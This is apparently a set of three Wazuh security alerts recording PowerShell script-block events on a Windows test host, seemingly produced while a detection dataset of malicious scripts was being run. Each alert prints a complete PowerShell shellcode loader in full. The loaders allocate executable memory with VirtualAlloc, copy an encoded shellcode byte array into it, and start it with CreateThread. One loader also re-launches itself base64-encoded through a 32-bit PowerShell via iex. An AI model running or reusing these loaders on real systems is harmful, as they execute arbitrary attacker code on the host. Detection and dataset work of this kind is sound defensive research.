{"timestamp":"2026-07-06T02:21:52.796+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":201,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304512.4128890","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:13.0919801Z","eventRecordID":"145855","processID":"2644","threadID":"6900","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$BiLa = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $BiLa -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0xb9,0xbf,0x14,0x1a,0xd9,0xf6,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x59,0x31,0x58,0x13,0x83,0xc0,0x04,0x03,0x58,0xb6,0x5d,0xe1,0xe6,0x20,0x23,0x0a,0x17,0xb0,0x44,0x82,0xf2,0x81,0x44,0xf0,0x77,0xb1,0x74,0x72,0xd5,0x3d,0xfe,0xd6,0xce,0xb6,0x72,0xff,0xe1,0x7f,0x38,0xd9,0xcc,0x80,0x11,0x19,0x4e,0x02,0x68,0x4e,0xb0,0x3b,0xa3,0x83,0xb1,0x7c,0xde,0x6e,0xe3,0xd5,0x94,0xdd,0x14,0x52,0xe0,0xdd,0x9f,0x28,0xe4,0x65,0x43,0xf8,0x07,0x47,0xd2,0x73,0x5e,0x47,0xd4,0x50,0xea,0xce,0xce,0xb5,0xd7,0x99,0x65,0x0d,0xa3,0x1b,0xac,0x5c,0x4c,0xb7,0x91,0x51,0xbf,0xc9,0xd6,0x55,0x20,0xbc,0x2e,0xa6,0xdd,0xc7,0xf4,0xd5,0x39,0x4d,0xef,0x7d,0xc9,0xf5,0xcb,0x7c,0x1e,0x63,0x9f,0x72,0xeb,0xe7,0xc7,0x96,0xea,0x24,0x7c,0xa2,0x67,0xcb,0x53,0x23,0x33,0xe8,0x77,0x68,0xe7,0x91,0x2e,0xd4,0x46,0xad,0x31,0xb7,0x37,0x0b,0x39,0x55,0x23,0x26,0x60,0x31,0xdd,0x5c,0xef,0xc1,0x49,0xe8,0x66,0xaf,0xe0,0x42,0x11,0x63,0x84,0x4c,0xe6,0x84,0xbf,0xa0,0x33,0x29,0x13,0x90,0x90,0x9e,0xfb,0x2c,0x41,0x59,0x5b,0xaf,0xb8,0xca,0xf0,0x3a,0x40,0xbf,0xa5,0xd2,0x36,0x28,0x4a,0x23,0x5f,0xda,0x4a,0x23,0x9f,0xcd,0x0f,0x16,0xda,0x23,0xfb,0x58,0xb4,0x2b,0xac,0xd1,0xab,0x6d,0xad,0x37,0x5a,0xb7,0x01,0xd0,0x5d,0x05,0x46,0xa4,0x0d,0x3a,0xd5,0xf2,0xe2,0xea,0xb1,0x17,0x51,0x3c,0x79,0x17,0x8f,0xd6,0x17,0xed,0x6f,0xbe,0x67,0xc2,0x8f,0x3e,0xe1,0xc5,0xfa,0x3a,0xa1,0x6f,0xe4,0x14,0x29,0x05,0x5c,0x06,0x2f,0x1a,0xb5,0x65,0x63,0xb6,0x65,0xdf,0xeb,0x15,0x8c,0xc7,0x90,0x9a,0x45,0x72,0xa6,0x10,0x6c,0x33,0x52,0x02,0x18,0x3b,0x29,0x16,0x8f,0x44,0x87,0x3d,0x70,0xd2,0x28,0xd2,0x70,0x22,0x41,0xd2,0x70,0x62,0x91,0x81,0x18,0x3a,0x35,0x76,0x3c,0x45,0xe0,0xea,0xed,0xea,0x82,0xea,0x45,0x64,0x95,0xd4,0x69,0x74,0xc6,0x42,0x02,0x66,0x7e,0xe3,0x30,0x79,0xab,0x71,0x74,0xf1,0x99,0xf1,0x72,0xf8,0xe2,0x83,0xbd,0x8f,0x01,0xd3,0xfe,0x30,0x22,0x91,0xff,0x31,0x4d,0x3e,0x65,0xbb,0xdb,0xdc,0x00,0x2b,0x7d,0x40,0xa0,0xce,0x19,0xa8,0x52,0x74,0x8c,0xc7,0xb4,0x1a,0x35,0x5c,0xc9;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$cz5=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($cz5.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$cz5,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: dbfb611f-67bc-454f-aef2-77b30ac7d149\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$BiLa = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $BiLa -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0xb9,0xbf,0x14,0x1a,0xd9,0xf6,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x59,0x31,0x58,0x13,0x83,0xc0,0x04,0x03,0x58,0xb6,0x5d,0xe1,0xe6,0x20,0x23,0x0a,0x17,0xb0,0x44,0x82,0xf2,0x81,0x44,0xf0,0x77,0xb1,0x74,0x72,0xd5,0x3d,0xfe,0xd6,0xce,0xb6,0x72,0xff,0xe1,0x7f,0x38,0xd9,0xcc,0x80,0x11,0x19,0x4e,0x02,0x68,0x4e,0xb0,0x3b,0xa3,0x83,0xb1,0x7c,0xde,0x6e,0xe3,0xd5,0x94,0xdd,0x14,0x52,0xe0,0xdd,0x9f,0x28,0xe4,0x65,0x43,0xf8,0x07,0x47,0xd2,0x73,0x5e,0x47,0xd4,0x50,0xea,0xce,0xce,0xb5,0xd7,0x99,0x65,0x0d,0xa3,0x1b,0xac,0x5c,0x4c,0xb7,0x91,0x51,0xbf,0xc9,0xd6,0x55,0x20,0xbc,0x2e,0xa6,0xdd,0xc7,0xf4,0xd5,0x39,0x4d,0xef,0x7d,0xc9,0xf5,0xcb,0x7c,0x1e,0x63,0x9f,0x72,0xeb,0xe7,0xc7,0x96,0xea,0x24,0x7c,0xa2,0x67,0xcb,0x53,0x23,0x33,0xe8,0x77,0x68,0xe7,0x91,0x2e,0xd4,0x46,0xad,0x31,0xb7,0x37,0x0b,0x39,0x55,0x23,0x26,0x60,0x31,0xdd,0x5c,0xef,0xc1,0x49,0xe8,0x66,0xaf,0xe0,0x42,0x11,0x63,0x84,0x4c,0xe6,0x84,0xbf,0xa0,0x33,0x29,0x13,0x90,0x90,0x9e,0xfb,0x2c,0x41,0x59,0x5b,0xaf,0xb8,0xca,0xf0,0x3a,0x40,0xbf,0xa5,0xd2,0x36,0x28,0x4a,0x23,0x5f,0xda,0x4a,0x23,0x9f,0xcd,0x0f,0x16,0xda,0x23,0xfb,0x58,0xb4,0x2b,0xac,0xd1,0xab,0x6d,0xad,0x37,0x5a,0xb7,0x01,0xd0,0x5d,0x05,0x46,0xa4,0x0d,0x3a,0xd5,0xf2,0xe2,0xea,0xb1,0x17,0x51,0x3c,0x79,0x17,0x8f,0xd6,0x17,0xed,0x6f,0xbe,0x67,0xc2,0x8f,0x3e,0xe1,0xc5,0xfa,0x3a,0xa1,0x6f,0xe4,0x14,0x29,0x05,0x5c,0x06,0x2f,0x1a,0xb5,0x65,0x63,0xb6,0x65,0xdf,0xeb,0x15,0x8c,0xc7,0x90,0x9a,0x45,0x72,0xa6,0x10,0x6c,0x33,0x52,0x02,0x18,0x3b,0x29,0x16,0x8f,0x44,0x87,0x3d,0x70,0xd2,0x28,0xd2,0x70,0x22,0x41,0xd2,0x70,0x62,0x91,0x81,0x18,0x3a,0x35,0x76,0x3c,0x45,0xe0,0xea,0xed,0xea,0x82,0xea,0x45,0x64,0x95,0xd4,0x69,0x74,0xc6,0x42,0x02,0x66,0x7e,0xe3,0x30,0x79,0xab,0x71,0x74,0xf1,0x99,0xf1,0x72,0xf8,0xe2,0x83,0xbd,0x8f,0x01,0xd3,0xfe,0x30,0x22,0x91,0xff,0x31,0x4d,0x3e,0x65,0xbb,0xdb,0xdc,0x00,0x2b,0x7d,0x40,0xa0,0xce,0x19,0xa8,0x52,0x74,0x8c,0xc7,0xb4,0x1a,0x35,0x5c,0xc9;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$cz5=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($cz5.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$cz5,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"dbfb611f-67bc-454f-aef2-77b30ac7d149"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:54.022+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":202,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304514.4141394","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:14.0615845Z","eventRecordID":"145861","processID":"3896","threadID":"4112","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$1 = '$c = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x04,0xea,0x1c,0x18,0xda,0xc1,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x52,0x31,0x5a,0x12,0x03,0x5a,0x12,0x83,0xc6,0xee,0xfe,0xed,0x3a,0x06,0x7c,0x0d,0xc2,0xd7,0xe1,0x87,0x27,0xe6,0x21,0xf3,0x2c,0x59,0x92,0x77,0x60,0x56,0x59,0xd5,0x90,0xed,0x2f,0xf2,0x97,0x46,0x85,0x24,0x96,0x57,0xb6,0x15,0xb9,0xdb,0xc5,0x49,0x19,0xe5,0x05,0x9c,0x58,0x22,0x7b,0x6d,0x08,0xfb,0xf7,0xc0,0xbc,0x88,0x42,0xd9,0x37,0xc2,0x43,0x59,0xa4,0x93,0x62,0x48,0x7b,0xaf,0x3c,0x4a,0x7a,0x7c,0x35,0xc3,0x64,0x61,0x70,0x9d,0x1f,0x51,0x0e,0x1c,0xc9,0xab,0xef,0xb3,0x34,0x04,0x02,0xcd,0x71,0xa3,0xfd,0xb8,0x8b,0xd7,0x80,0xba,0x48,0xa5,0x5e,0x4e,0x4a,0x0d,0x14,0xe8,0xb6,0xaf,0xf9,0x6f,0x3d,0xa3,0xb6,0xe4,0x19,0xa0,0x49,0x28,0x12,0xdc,0xc2,0xcf,0xf4,0x54,0x90,0xeb,0xd0,0x3d,0x42,0x95,0x41,0x98,0x25,0xaa,0x91,0x43,0x99,0x0e,0xda,0x6e,0xce,0x22,0x81,0xe6,0x7e,0x58,0x4d,0xf7,0x16,0xd5,0xc4,0x99,0x8f,0x4d,0x7e,0x2a,0x27,0x48,0x79,0x4d,0x12,0xa5,0x5e,0xe2,0xce,0x95,0x33,0x56,0x99,0x23,0xe5,0x21,0xfe,0xab,0xdc,0x81,0x53,0x3e,0xdd,0x76,0x07,0xd6,0x6e,0x68,0xa7,0x26,0x98,0xf1,0xa7,0x26,0x58,0x2d,0x9c,0x63,0x13,0x75,0x88,0x6b,0xf3,0x1d,0x67,0xe5,0x6c,0x1b,0x78,0x20,0x1b,0x62,0xd4,0xa3,0x1b,0x69,0xbb,0xb7,0x48,0x3e,0x68,0xef,0x3d,0x96,0xe6,0xe4,0x94,0x38,0xcc,0x05,0xc3,0xd3,0x58,0xf0,0xb4,0x88,0xcf,0x57,0x19,0x79,0x98,0x7a,0x9b,0x9d,0x23,0x7a,0x76,0x18,0x13,0xf1,0x72,0x6c,0xe1,0x17,0xea,0x82,0xbc,0x4a,0xbc,0x9d,0x6a,0xe0,0x00,0x0a,0x95,0xe5,0x80,0xca,0xfd,0x05,0x80,0x8a,0xfd,0x56,0xe8,0x52,0x5a,0x0b,0x0d,0x9d,0x77,0x3f,0x9e,0x31,0xf1,0xa7,0x77,0xde,0x01,0x08,0x77,0x1e,0x51,0x1e,0x1f,0x0c,0xc3,0x17,0x3d,0xcf,0x3e,0xa2,0x01,0x44,0x0c,0x26,0x86,0xa4,0x4d,0xbc,0x48,0xd3,0xb4,0xe7,0x8b,0x43,0xdf,0x91,0xf4,0x83,0xe0,0x93,0x32,0x49,0x31,0xe3,0x71,0x9f,0x7e,0x3c,0x5b,0xe7,0xb1,0x42;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = \"-enc \";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";iex \"& $3 $2 $e\"}else{;iex \"& powershell $2 $e\";}\r\n\r\nScriptBlock ID: 110e27eb-dc7c-4355-85ba-be5ce64b07e4\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\444.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$1 = '$c = ''[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x04,0xea,0x1c,0x18,0xda,0xc1,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x52,0x31,0x5a,0x12,0x03,0x5a,0x12,0x83,0xc6,0xee,0xfe,0xed,0x3a,0x06,0x7c,0x0d,0xc2,0xd7,0xe1,0x87,0x27,0xe6,0x21,0xf3,0x2c,0x59,0x92,0x77,0x60,0x56,0x59,0xd5,0x90,0xed,0x2f,0xf2,0x97,0x46,0x85,0x24,0x96,0x57,0xb6,0x15,0xb9,0xdb,0xc5,0x49,0x19,0xe5,0x05,0x9c,0x58,0x22,0x7b,0x6d,0x08,0xfb,0xf7,0xc0,0xbc,0x88,0x42,0xd9,0x37,0xc2,0x43,0x59,0xa4,0x93,0x62,0x48,0x7b,0xaf,0x3c,0x4a,0x7a,0x7c,0x35,0xc3,0x64,0x61,0x70,0x9d,0x1f,0x51,0x0e,0x1c,0xc9,0xab,0xef,0xb3,0x34,0x04,0x02,0xcd,0x71,0xa3,0xfd,0xb8,0x8b,0xd7,0x80,0xba,0x48,0xa5,0x5e,0x4e,0x4a,0x0d,0x14,0xe8,0xb6,0xaf,0xf9,0x6f,0x3d,0xa3,0xb6,0xe4,0x19,0xa0,0x49,0x28,0x12,0xdc,0xc2,0xcf,0xf4,0x54,0x90,0xeb,0xd0,0x3d,0x42,0x95,0x41,0x98,0x25,0xaa,0x91,0x43,0x99,0x0e,0xda,0x6e,0xce,0x22,0x81,0xe6,0x7e,0x58,0x4d,0xf7,0x16,0xd5,0xc4,0x99,0x8f,0x4d,0x7e,0x2a,0x27,0x48,0x79,0x4d,0x12,0xa5,0x5e,0xe2,0xce,0x95,0x33,0x56,0x99,0x23,0xe5,0x21,0xfe,0xab,0xdc,0x81,0x53,0x3e,0xdd,0x76,0x07,0xd6,0x6e,0x68,0xa7,0x26,0x98,0xf1,0xa7,0x26,0x58,0x2d,0x9c,0x63,0x13,0x75,0x88,0x6b,0xf3,0x1d,0x67,0xe5,0x6c,0x1b,0x78,0x20,0x1b,0x62,0xd4,0xa3,0x1b,0x69,0xbb,0xb7,0x48,0x3e,0x68,0xef,0x3d,0x96,0xe6,0xe4,0x94,0x38,0xcc,0x05,0xc3,0xd3,0x58,0xf0,0xb4,0x88,0xcf,0x57,0x19,0x79,0x98,0x7a,0x9b,0x9d,0x23,0x7a,0x76,0x18,0x13,0xf1,0x72,0x6c,0xe1,0x17,0xea,0x82,0xbc,0x4a,0xbc,0x9d,0x6a,0xe0,0x00,0x0a,0x95,0xe5,0x80,0xca,0xfd,0x05,0x80,0x8a,0xfd,0x56,0xe8,0x52,0x5a,0x0b,0x0d,0x9d,0x77,0x3f,0x9e,0x31,0xf1,0xa7,0x77,0xde,0x01,0x08,0x77,0x1e,0x51,0x1e,0x1f,0x0c,0xc3,0x17,0x3d,0xcf,0x3e,0xa2,0x01,0x44,0x0c,0x26,0x86,0xa4,0x4d,0xbc,0x48,0xd3,0xb4,0xe7,0x8b,0x43,0xdf,0x91,0xf4,0x83,0xe0,0x93,0x32,0x49,0x31,0xe3,0x71,0x9f,0x7e,0x3c,0x5b,0xe7,0xb1,0x42;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = \\\"-enc \\\";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + \\\"\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell\\\";iex \\\"&amp; $3 $2 $e\\\"}else{;iex \\\"&amp; powershell $2 $e\\\";}","scriptBlockId":"110e27eb-dc7c-4355-85ba-be5ce64b07e4","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\444.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:55.008+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":203,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304515.4154635","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:14.7896391Z","eventRecordID":"145865","processID":"1008","threadID":"3088","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$abqS = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $abqS -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0xd8,0x6d,0x60,0x70,0xd9,0xc9,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x4e,0x31,0x70,0x13,0x03,0x70,0x13,0x83,0xc0,0xdc,0x8f,0x95,0x8c,0x34,0xcd,0x56,0x6d,0xc4,0xb2,0xdf,0x88,0xf5,0xf2,0x84,0xd9,0xa5,0xc2,0xcf,0x8c,0x49,0xa8,0x82,0x24,0xda,0xdc,0x0a,0x4a,0x6b,0x6a,0x6d,0x65,0x6c,0xc7,0x4d,0xe4,0xee,0x1a,0x82,0xc6,0xcf,0xd4,0xd7,0x07,0x08,0x08,0x15,0x55,0xc1,0x46,0x88,0x4a,0x66,0x12,0x11,0xe0,0x34,0xb2,0x11,0x15,0x8c,0xb5,0x30,0x88,0x87,0xef,0x92,0x2a,0x44,0x84,0x9a,0x34,0x89,0xa1,0x55,0xce,0x79,0x5d,0x64,0x06,0xb0,0x9e,0xcb,0x67,0x7d,0x6d,0x15,0xaf,0xb9,0x8e,0x60,0xd9,0xba,0x33,0x73,0x1e,0xc1,0xef,0xf6,0x85,0x61,0x7b,0xa0,0x61,0x90,0xa8,0x37,0xe1,0x9e,0x05,0x33,0xad,0x82,0x98,0x90,0xc5,0xbe,0x11,0x17,0x0a,0x37,0x61,0x3c,0x8e,0x1c,0x31,0x5d,0x97,0xf8,0x94,0x62,0xc7,0xa3,0x49,0xc7,0x83,0x49,0x9d,0x7a,0xce,0x05,0x52,0xb7,0xf1,0xd5,0xfc,0xc0,0x82,0xe7,0xa3,0x7a,0x0d,0x4b,0x2b,0xa5,0xca,0xac,0x06,0x11,0x44,0x53,0xa9,0x62,0x4c,0x97,0xfd,0x32,0xe6,0x3e,0x7e,0xd9,0xf6,0xbf,0xab,0x4e,0xa7,0x6f,0x04,0x2f,0x17,0xcf,0xf4,0xc7,0x7d,0xc0,0x2b,0xf7,0x7d,0x0b,0x44,0x10,0x90,0xb3,0x6b,0xe1,0xf7,0xd7,0x04,0x92,0xc3,0x27,0xeb,0x7a,0x48,0x23,0x65,0xf0,0xbe,0xc5,0x1c,0x82,0xbe,0x71,0x76,0x42,0x8b,0x01,0x77,0x46,0x78,0x41,0x94,0x03,0x7a,0x11,0xcc,0xd1,0x84,0x8e,0x9d,0x5f,0x62,0xda,0x8d,0x09,0x3c,0x72,0x37,0x10,0xb6,0xe3,0xb8,0x8e,0xb2,0x23,0x32,0x3d,0x42,0xed,0xb3,0x48,0x50,0x99,0x33,0x07,0x0a,0x0f,0x4b,0xbd,0x21,0xaf,0xd9,0x3a,0xe0,0xf8,0x75,0x41,0xd5,0xce,0xd9,0xba,0x30,0x45,0xd3,0x2e,0xfb,0x31,0x1c,0xbf,0xfb,0xc1,0x4a,0xd5,0xfb,0xa9,0x2a,0x8d,0xaf,0xcc,0x34,0x18,0xdc,0x5d,0xa1,0xa3,0xb5,0x32,0x62,0xcc,0x3b,0x6d,0x44,0x53,0xc3,0x58,0x54,0xaf,0x12,0xa4,0x22,0xc1,0xa6;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Ai4=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Ai4.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Ai4,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 111c9001-0991-49d9-a97a-49f77aaa881c\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\451.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$abqS = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $abqS -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0xd8,0x6d,0x60,0x70,0xd9,0xc9,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x4e,0x31,0x70,0x13,0x03,0x70,0x13,0x83,0xc0,0xdc,0x8f,0x95,0x8c,0x34,0xcd,0x56,0x6d,0xc4,0xb2,0xdf,0x88,0xf5,0xf2,0x84,0xd9,0xa5,0xc2,0xcf,0x8c,0x49,0xa8,0x82,0x24,0xda,0xdc,0x0a,0x4a,0x6b,0x6a,0x6d,0x65,0x6c,0xc7,0x4d,0xe4,0xee,0x1a,0x82,0xc6,0xcf,0xd4,0xd7,0x07,0x08,0x08,0x15,0x55,0xc1,0x46,0x88,0x4a,0x66,0x12,0x11,0xe0,0x34,0xb2,0x11,0x15,0x8c,0xb5,0x30,0x88,0x87,0xef,0x92,0x2a,0x44,0x84,0x9a,0x34,0x89,0xa1,0x55,0xce,0x79,0x5d,0x64,0x06,0xb0,0x9e,0xcb,0x67,0x7d,0x6d,0x15,0xaf,0xb9,0x8e,0x60,0xd9,0xba,0x33,0x73,0x1e,0xc1,0xef,0xf6,0x85,0x61,0x7b,0xa0,0x61,0x90,0xa8,0x37,0xe1,0x9e,0x05,0x33,0xad,0x82,0x98,0x90,0xc5,0xbe,0x11,0x17,0x0a,0x37,0x61,0x3c,0x8e,0x1c,0x31,0x5d,0x97,0xf8,0x94,0x62,0xc7,0xa3,0x49,0xc7,0x83,0x49,0x9d,0x7a,0xce,0x05,0x52,0xb7,0xf1,0xd5,0xfc,0xc0,0x82,0xe7,0xa3,0x7a,0x0d,0x4b,0x2b,0xa5,0xca,0xac,0x06,0x11,0x44,0x53,0xa9,0x62,0x4c,0x97,0xfd,0x32,0xe6,0x3e,0x7e,0xd9,0xf6,0xbf,0xab,0x4e,0xa7,0x6f,0x04,0x2f,0x17,0xcf,0xf4,0xc7,0x7d,0xc0,0x2b,0xf7,0x7d,0x0b,0x44,0x10,0x90,0xb3,0x6b,0xe1,0xf7,0xd7,0x04,0x92,0xc3,0x27,0xeb,0x7a,0x48,0x23,0x65,0xf0,0xbe,0xc5,0x1c,0x82,0xbe,0x71,0x76,0x42,0x8b,0x01,0x77,0x46,0x78,0x41,0x94,0x03,0x7a,0x11,0xcc,0xd1,0x84,0x8e,0x9d,0x5f,0x62,0xda,0x8d,0x09,0x3c,0x72,0x37,0x10,0xb6,0xe3,0xb8,0x8e,0xb2,0x23,0x32,0x3d,0x42,0xed,0xb3,0x48,0x50,0x99,0x33,0x07,0x0a,0x0f,0x4b,0xbd,0x21,0xaf,0xd9,0x3a,0xe0,0xf8,0x75,0x41,0xd5,0xce,0xd9,0xba,0x30,0x45,0xd3,0x2e,0xfb,0x31,0x1c,0xbf,0xfb,0xc1,0x4a,0xd5,0xfb,0xa9,0x2a,0x8d,0xaf,0xcc,0x34,0x18,0xdc,0x5d,0xa1,0xa3,0xb5,0x32,0x62,0xcc,0x3b,0x6d,0x44,0x53,0xc3,0x58,0x54,0xaf,0x12,0xa4,0x22,0xc1,0xa6;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Ai4=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Ai4.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Ai4,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"111c9001-0991-49d9-a97a-49f77aaa881c","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\451.ps1"}}},"location":"EventChannel"}
